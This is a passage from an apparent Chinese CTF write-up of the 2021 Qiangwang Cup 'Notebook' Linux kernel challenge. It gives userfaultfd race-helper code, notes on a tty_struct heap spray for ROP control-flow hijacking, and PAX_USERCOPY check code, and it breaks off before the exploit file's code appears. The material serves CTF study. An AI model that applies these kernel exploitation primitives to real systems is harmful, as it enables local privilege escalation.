class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> PAGE_SIZE;</span><br><span class="line"><span class="type">void</span> <span class="title function_">errExit</span><span class="params">(<span class="type">char</span>* msg)</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[x] Error at: %s\n&quot;</span>, msg);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">userfault_register</span><span class="params">(<span class="type">void</span>* fault_addr, <span class="type">void</span>* fault_handler_thread)</span> &#123;</span><br><span class="line">    <span class="type">long</span> uffd;     <span class="comment">/* userfaultfd file descriptor */</span></span><br><span class="line">    <span class="type">pthread_t</span> thr; <span class="comment">/* ID of thread that handles page faults */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_api</span> <span class="title">uffdio_api</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_register</span> <span class="title">uffdio_register</span>;</span></span><br><span class="line">    <span class="comment">//创建和初始化api</span></span><br><span class="line">    uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);</span><br><span class="line">    <span class="keyword">if</span> (uffd == <span class="number">-1</span>)</span><br><span class="line">        errExit(<span class="string">&quot;userfaultfd&quot;</span>);</span><br><span class="line">    uffdio_api.api = UFFD_API;</span><br><span class="line">    uffdio_api.features = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (ioctl(uffd, UFFDIO_API, &amp;uffdio_api) == <span class="number">-1</span>)</span><br><span class="line">        errExit(<span class="string">&quot;ioctl-UFFDIO_API&quot;</span>);</span><br><span class="line">    <span class="comment">//注册内存</span></span><br><span class="line">    uffdio_register.range.start = (<span class="type">unsigned</span> <span class="type">long</span>)fault_addr;</span><br><span class="line">    uffdio_register.range.len = len;</span><br><span class="line">    uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;</span><br><span class="line">    <span class="keyword">if</span> (ioctl(uffd, UFFDIO_REGISTER, &amp;uffdio_register) == <span class="number">-1</span>)</span><br><span class="line">        errExit(<span class="string">&quot;ioctl-UFFDIO_REGISTER&quot;</span>);</span><br><span class="line">    <span class="comment">//创建monitor线程，处理page fault</span></span><br><span class="line">    <span class="type">int</span> s = pthread_create(&amp;thr, <span class="literal">NULL</span>, fault_handler_thread, (<span class="type">void</span>*)uffd);</span><br><span class="line">    <span class="keyword">if</span> (s != <span class="number">0</span>) &#123;</span><br><span class="line">        errno = s;</span><br><span class="line">        errExit(<span class="string">&quot;pthread_create&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">fault_handler_thread</span><span class="params">(<span class="type">void</span>* arg)</span> &#123;</span><br><span class="line">    <span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">uffd_msg</span> <span class="title">msg</span>;</span></span><br><span class="line">    <span class="type">long</span> uffd;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_copy</span> <span class="title">uffdio_copy</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> <span class="title">pollfd</span>;</span></span><br><span class="line">    <span class="type">int</span> nread;</span><br><span class="line">    <span class="type">int</span> nready;</span><br><span class="line">    uffd = (<span class="type">long</span>)arg;</span><br><span class="line">    pollfd.fd = uffd;</span><br><span class="line">    pollfd.events = POLLIN;</span><br><span class="line">    nready = poll(&amp;pollfd, <span class="number">1</span>, <span class="number">-1</span>);</span><br><span class="line">    <span class="keyword">if</span> (nready == <span class="number">-1</span>)</span><br><span class="line">        errExit(<span class="string">&quot;poll&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (nready != <span class="number">1</span>) &#123;</span><br><span class="line">        errExit(<span class="string">&quot;[-] Wrong poll return val&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    nread = read(uffd, &amp;msg, <span class="keyword">sizeof</span>(msg));</span><br><span class="line">    <span class="keyword">if</span> (nread &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">        errExit(<span class="string">&quot;[-] msg err&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">char</span>* page = (<span class="type">char</span>*)mmap(<span class="literal">NULL</span>, PAGE_SIZE, PROT_READ | PROT_WRITE,</span><br><span class="line">                             MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (page == MAP_FAILED) &#123;</span><br><span class="line">        errExit(<span class="string">&quot;[-] mmap err&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// init page</span></span><br><span class="line">    <span class="built_in">memset</span>(page, <span class="number">0</span>, <span class="keyword">sizeof</span>(page));</span><br><span class="line">    uffdio_copy.src = (<span class="type">unsigned</span> <span class="type">long</span>)page;</span><br><span class="line">    uffdio_copy.dst =</span><br><span class="line">        (<span class="type">unsigned</span> <span class="type">long</span>)msg.arg.pagefault.address &amp; ~(PAGE_SIZE - <span class="number">1</span>);</span><br><span class="line">    uffdio_copy.len = PAGE_SIZE;</span><br><span class="line">    uffdio_copy.mode = <span class="number">0</span>;</span><br><span class="line">    uffdio_copy.copy = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (ioctl(uffd, UFFDIO_COPY, &amp;uffdio_copy) == <span class="number">-1</span>)</span><br><span class="line">        errExit(<span class="string">&quot;ioctl-UFFDIO_COPY&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] fault_handler done&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>使用时根据需求自己进行调整即可，在handler处加sleep() 较长时间的话，可以让userfault卡在那里 ，从而更好地进行race</p>
<h1 id="2021强网杯-Notebook"><a href="#2021强网杯-Notebook" class="headerlink" title="2021强网杯 Notebook"></a>2021强网杯 Notebook</h1><p>思路基本参考了 arttnba3师傅 <a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/253835#h3-8">https://www.anquanke.com/post/id/253835#h3-8</a> ，在这里不赘述了</p>
<p>使用的是userfault+heap spray tty，劫持tty从而进行rop</p>
<p>要注意的点：</p>
<p><img src="https://blogimg-1314041910.cos.ap-guangzhou.myqcloud.com/image-20221101023458787.png" alt="image-20221101023458787"></p>
<blockquote>
<p>搬运一下一位师傅的<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/253835#h3-8">https://www.anquanke.com/post/id/253835#h3-8</a></p>
<p><strong>ptm_unix98_ops &amp;&amp; pty_unix98_ops</strong></p>
<p>在 ptmx 被打开时内核通过 <code>alloc_tty_struct()</code> 分配 tty_struct 的内存空间，之后会将 tty_operations 初始化为<strong>全局变量</strong> <code>ptm_unix98_ops</code> 或 <code>pty_unix98_ops</code>，在调试阶段我们可以先关掉 kaslr 开 root 从 <code>/proc/kallsyms</code> 中读取其偏移</p>
<p>开启了 kaslr 的内核在内存中的偏移依然以内存页为粒度，故我们可以通过比对 tty_operations 地址的低三16进制位来判断是 ptm_unix98_ops 还是 pty_unix98_ops</p>
</blockquote>
<p>_check_object_size 函数， 这使得我们需要修复notebook的size，其大小要小于等于其buf大小</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://github.com/hardenedlinux/grsecurity-101-tutorials/blob/master/grsec-code-analysis/PAX_USERCOPY.md">https://github.com/hardenedlinux/grsecurity-101-tutorials/blob/master/grsec-code-analysis/PAX_USERCOPY.md</a></p>
<p>他的设计思路是：</p>
<ol>
<li>若指针在堆中，检查复制数据是否会溢出到非分配区域</li>
<li>若在栈中，检查复制数据是否将会溢出到非当前栈帧中</li>
</ol>
<p>在堆上的检查，主要是指针合法性检查，指针指向的内存属性检查，复制的长度计算检查，返回NULL会进入栈上检查，返回包含内存信息字符串用于后续报错，代码如下：</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_PAX_USERCOPY</span></span><br><span class="line"><span class="type">const</span> <span class="type">char</span> *<span class="title function_">check_heap_object</span><span class="params">(<span class="type">const</span> <span class="type">void</span> *ptr, <span class="type">unsigned</span> <span class="type">long</span> n, <span class="type">bool</span> to)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache</span> *<span class="title">cachep</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">slab</span> *<span class="title">slabp</span>;</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> objnr;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> offset;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (ZERO_OR_NULL_PTR(ptr))   <span class="comment">/*指针为空指针，返回字符串，直接进入 pax_report_usercopy*/</span></span><br><span class="line">		<span class="keyword">return</span> <span class="string">&quot;&lt;null&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!virt_addr_valid(ptr))   <span class="comment">/*虚拟地址不合法，进入 check_stack_object 检查*/</span></span><br><span class="line">		<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	page = virt_to_head_page(ptr);   <span class="comment">/*获得该地址所在的页*/</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!PageSlab(page))         <span class="comment">/*不是通过 kmalloc 而来，栈上*/</span></span><br><span class="line">		<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	cachep = page_get_cache(page);        <span class="comment">/*获得指针相应的 kmem_cache 结构体*/</span></span><br><span class="line">	<span class="keyword">if</span> (!(cachep-&gt;flags &amp; SLAB_USERCOPY))  <span class="comment">/* SLAB_USERCOPY 若未置位，说明该内存不能进行 usercopy*/</span></span><br><span class="line">        <span class="keyword">return</span> cachep-&gt;name;            <span class="comment">/*返回包含slab信息的字符串，进入pax_report_usercopy报错*/</span></span><br><span class="line"></span><br><span class="line">	slabp = page_get_slab(page);               <span class="comment">/*获得 slab* 指针*/</span></span><br><span class="line">	objnr = obj_to_index(cachep, slabp, ptr);</span><br><span class="line">	BUG_ON(objnr &gt;= cachep-&gt;num);              <span class="comment">/*超出分配的object个数*/</span></span><br><span class="line">	offset = ptr - index_to_obj(cachep, slabp, objnr) - obj_offset(cachep); <span class="comment">/*指针相对长度，这里涉及一些 slab 的 object 数组的转换计算*/</span></span><br><span class="line">	<span class="keyword">if</span> (offset &lt;= obj_size(cachep) &amp;&amp; n &lt;= obj_size(cachep) - offset)  <span class="comment">/*长度检查通过*/</span></span><br><span class="line">		<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> cachep-&gt;name;           <span class="comment">/*返回 cache 信息，供 pax_report_usercopy 报错*/</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure>

<h1 id=""><a href="#" class="headerlink" title=""></a></h1><p>myusfd.h</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/userfaultfd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> PAGE_SIZE = <span class="number">0x1000</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">errExit</span><span class="params">(<span class="type">char</span>* msg)</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[x] Error at: %s\n&quot;</span>, msg);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">userfault_register</span><span class="params">(<span class="type">void</span>* fault_addr, <span class="type">void</span>* fault_handler_thread)</span> &#123;</span><br><span class="line">    <span class="type">long</span> uffd;     <span class="comment">/* userfaultfd file descriptor */</span></span><br><span class="line">    <span class="type">pthread_t</span> thr; <span class="comment">/* ID of thread that handles page faults */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_api</span> <span class="title">uffdio_api</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_register</span> <span class="title">uffdio_register</span>;</span></span><br><span class="line">    <span class="comment">//创建和初始化api</span></span><br><span class="line">    uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);</span><br><span class="line">    <span class="keyword">if</span> (uffd == <span class="number">-1</span>)</span><br><span class="line">        errExit(<span class="string">&quot;userfaultfd&quot;</span>);</span><br><span class="line">    uffdio_api.api = UFFD_API;</span><br><span class="line">    uffdio_api.features = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (ioctl(uffd, UFFDIO_API, &amp;uffdio_api) == <span class="number">-1</span>)</span><br><span class="line">        errExit(<span class="string">&quot;ioctl-UFFDIO_API&quot;</span>);</span><br><span class="line">    <span class="comment">//注册内存</span></span><br><span class="line">    uffdio_register.range.start = (<span class="type">unsigned</span> <span class="type">long</span>)fault_addr;</span><br><span class="line">    uffdio_register.range.len = PAGE_SIZE;</span><br><span class="line">    uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;</span><br><span class="line">    <span class="keyword">if</span> (ioctl(uffd, UFFDIO_REGISTER, &amp;uffdio_register) == <span class="number">-1</span>)</span><br><span class="line">        errExit(<span class="string">&quot;ioctl-UFFDIO_REGISTER&quot;</span>);</span><br><span class="line">    <span class="comment">//创建monitor线程，处理page fault</span></span><br><span class="line">    <span class="type">int</span> s = pthread_create(&amp;thr, <span class="literal">NULL</span>, fault_handler_thread, (<span class="type">void</span>*)uffd);</span><br><span class="line">    <span class="keyword">if</span> (s != <span class="number">0</span>) &#123;</span><br><span class="line">        errno = s;</span><br><span class="line">        errExit(<span class="string">&quot;pthread_create&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tty_driver</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">serial_icounter_struct</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tty_operations</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span>* (*<span class="title">lookup</span>)(<span class="keyword">struct</span> <span class="title">tty_driver</span>* <span class="title">driver</span>,</span></span><br><span class="line"><span class="class">                                 <span class="keyword">struct</span> <span class="title">file</span>* <span class="title">filp</span>,</span></span><br><span class="line"><span class="class">                                 <span class="title">int</span> <span class="title">idx</span>);</span></span><br><span class="line">    <span class="type">int</span> (*install)(<span class="keyword">struct</span> tty_driver* driver, <span class="keyword">struct</span> tty_struct* tty);</span><br><span class="line">    <span class="type">void</span> (*remove)(<span class="keyword">struct</span> tty_driver* driver, <span class="keyword">struct</span> tty_struct* tty);</span><br><span class="line">    <span class="type">int</span> (*open)(<span class="keyword">struct</span> tty_struct* tty, <span class="keyword">struct</span> file* filp);</span><br><span class="line">    <span class="type">void</span> (*close)(<span class="keyword">struct</span> tty_struct* tty, <span class="keyword">struct</span> file* filp);</span><br><span class="line">    <span class="type">void</span> (*shutdown)(<span class="keyword">struct</span> tty_struct* tty);</span><br><span class="line">    <span class="type">void</span> (*cleanup)(<span class="keyword">struct</span> tty_struct* tty);</span><br><span class="line">    <span class="type">int</span> (*write)(<span class="keyword">struct</span> tty_struct* tty, <span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span>* buf, <span class="type">int</span> count);</span><br><span class="line">    <span class="type">int</span> (*put_char)(<span class="keyword">struct</span> tty_struct* tty, <span class="type">unsigned</span> <span class="type">char</span> ch);</span><br><span class="line">    <span class="type">void</span> (*flush_chars)(<span class="keyword">struct</span> tty_struct* tty);</span><br><span class="line">    <span class="type">int</span> (*write_room)(<span class="keyword">struct</span> tty_struct* tty);</span><br><span class="line">    <span class="type">int</span> (*chars_in_buffer)(<span class="keyword">struct</span> tty_struct* tty);</span><br><span class="line">    <span class="type">int</span> (*ioctl)(<span class="keyword">struct</span> tty_struct* tty, <span class="type">unsigned</span> <span class="type">int</span> cmd, <span class="type">unsigned</span> <span class="type">long</span> arg);</span><br><span class="line">    <span class="type">long</span> (*compat_ioctl)(<span class="keyword">struct</span> tty_struct* tty,</span><br><span class="line">                         <span class="type">unsigned</span> <span class="type">int</span> cmd,</span><br><span class="line">                         <span class="type">unsigned</span> <span class="type">long</span> arg);</span><br><span class="line">    <span class="type">void</span> (*set_termios)(<span class="keyword">struct</span> tty_struct* tty, <span class="keyword">struct</span> ktermios* old);</span><br><span class="line">    <span class="type">void</span> (*throttle)(<span class="keyword">struct</span> tty_struct* tty);</span><br><span class="line">    <span class="type">void</span> (*unthrottle)(<span class="keyword">struct</span> tty_struct* tty);</span><br><span class="line">    <span class="type">void</span> (*stop)(<span class="keyword">struct</span> tty_struct* tty);</span><br><span class="line">    <span class="type">void</span> (*start)(<span class="keyword">struct</span> tty_struct* tty);</span><br><span class="line">    <span class="type">void</span> (*hangup)(<span class="keyword">struct</span> tty_struct* tty);</span><br><span class="line">    <span class="type">int</span> (*break_ctl)(<span class="keyword">struct</span> tty_struct* tty, <span class="type">int</span> state);</span><br><span class="line">    <span class="type">void</span> (*flush_buffer)(<span class="keyword">struct</span> tty_struct* tty);</span><br><span class="line">    <span class="type">void</span> (*set_ldisc)(<span class="keyword">struct</span> tty_struct* tty);</span><br><span class="line">    <span class="type">void</span> (*wait_until_sent)(<span class="keyword">struct</span> tty_struct* tty, <span class="type">int</span> timeout);</span><br><span class="line">    <span class="type">void</span> (*send_xchar)(<span class="keyword">struct</span> tty_struct* tty, <span class="type">char</span> ch);</span><br><span class="line">    <span class="type">int</span> (*tiocmget)(<span class="keyword">struct</span> tty_struct* tty);</span><br><span class="line">    <span class="type">int</span> (*tiocmset)(<span class="keyword">struct</span> tty_struct* tty,</span><br><span class="line">                    <span class="type">unsigned</span> <span class="type">int</span> <span class="built_in">set</span>,</span><br><span class="line">                    <span class="type">unsigned</span> <span class="type">int</span> clear);</span><br><span class="line">    <span class="type">int</span> (*resize)(<span class="keyword">struct</span> tty_struct* tty, <span class="keyword">struct</span> winsize* ws);</span><br><span class="line">    <span class="type">int</span> (*set_termiox)(<span class="keyword">struct</span> tty_struct* tty, <span class="keyword">struct</span> termiox* tnew);</span><br><span class="line">    <span class="type">int</span> (*get_icount)(<span class="keyword">struct</span> tty_struct* tty,</span><br><span class="line">                      <span class="keyword">struct</span> serial_icounter_struct* icount);</span><br><span class="line">    <span class="type">void</span> (*show_fdinfo)(<span class="keyword">struct</span> tty_struct* tty, <span class="keyword">struct</span> seq_file* m);</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_CONSOLE_POLL</span></span><br><span class="line">    <span class="type">int</span> (*poll_init)(<span class="keyword">struct</span> tty_driver* driver, <span class="type">int</span> line, <span class="type">char</span>* options);</span><br><span class="line">    <span class="type">int</span> (*poll_get_char)(<span class="keyword">struct</span> tty_driver* driver, <span class="type">int</span> line);</span><br><span class="line">    <span class="type">void</span> (*poll_put_char)(<span class="keyword">struct</span> tty_driver* driver, <span class="type">int</span> line, <span class="type">char</span> ch);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span>* <span class="title">proc_fops</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>myexp.c </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span 